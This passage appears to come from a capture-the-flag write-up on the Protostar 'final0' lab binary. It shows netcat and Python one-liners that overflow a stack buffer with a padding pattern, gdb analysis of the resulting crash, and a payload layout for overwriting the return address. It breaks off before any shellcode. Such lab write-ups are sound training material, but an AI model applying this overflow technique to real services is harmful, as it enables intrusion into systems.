First, I tried to connect to the target and send a small string:

```console
user@protostar:/opt/protostar/bin$ nc 127.0.0.1 2995
salut
No such user SALUT
^C
```

Then I tried with as many `'A'`'s as the program can deal with:

```console
user@protostar:/opt/protostar/bin$ python -c "alphabet = 'abcdefghijklmnopqrstuvwxyz'; print('A'*510)" | nc 127.0.0.1 2995
No such user AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
```

Afterward, I connected to the target again and sent each character of the alphabet 4 times as a big pattern:

```console
user@protostar:/opt/protostar/bin$ python -c "alphabet = 'abcdefghijklmnopqrstuvwxyz'; print('A'*510 + '\x00' + ''.join([c * 4 for c in alphabet]))" | nc 127.0.0.1 2995
```

This time the target didn't respond with the string `"No such user ..."` so I assume that the program crashed.

Indeed, if we open the **coredump** file with `gdb`, we can see that the program encounter a segfault because it tried to return to the address `0x67666666` (`0xgfff`):

```console
root@protostar:/opt/protostar/bin# gdb -q ./final0 /tmp/core.11.final0.2561
Reading symbols from /opt/protostar/bin/final0...done.

```

Okay we now that our payload should begin with `'A' * 510 + '\x00' + 'aaaabbbbccccddddeeeeffff' + <return_address>`

If `<return_address>` in our payload is `BBBB`, then we'll have a segfault at `0x42424242`:

```console
